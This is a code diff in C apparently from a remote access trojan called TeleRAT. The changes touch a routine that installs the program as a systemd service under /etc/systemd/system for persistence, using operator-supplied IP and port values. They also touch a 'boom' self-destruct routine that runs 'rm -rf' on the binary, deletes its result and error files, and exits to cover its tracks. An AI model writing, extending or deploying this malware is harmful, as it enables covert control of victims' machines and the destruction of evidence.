@@ -12,9 +12,11 @@ void i_am_root(){
 void getpName(char *pName){
     unsigned int len = strlen(pName);
     //parse ./move -> /move
-    strncpy(pName,pName+1,len-1);
+    if(pName[0] == '.'){
+    strncpy(pName,pName+2,len-2);
     //add null byte for stop string
-    pName[len-1] ='\0';
+    pName[len-2] ='\0';
+    }
 }
 
 //Get Now file location
@@ -36,7 +38,7 @@ void initSetiing(char *pName,char *ip,char *port){
     getpName(pName);
     getNowPath(path);
 	//Connect path with program	
-	sprintf(cmd.cmd,"%s%s",path,pName);
+	sprintf(cmd.cmd,"%s/%s",path,pName);
 	
 	//writing in /etc/systemd/system
 	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","wb");
@@ -79,12 +81,15 @@ void initSetiing(char *pName,char *ip,char *port){
 // }
 
 
-void boom(char *path,char *pName){
+void boom(char *pName){
     struct cmd_struct cmd;
-    getNowPath(cmd.nowPath);
     getpName(pName);
-    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
+    sprintf(cmd.cmd,"rm -rf %s",pName);
+    FILE *fp;
+    fp = popen("rm error.txt result.txt","r");
+    pclose(fp);
     exeCMD(cmd.cmd);
+    exit(1);
 }
 
 char *help(){
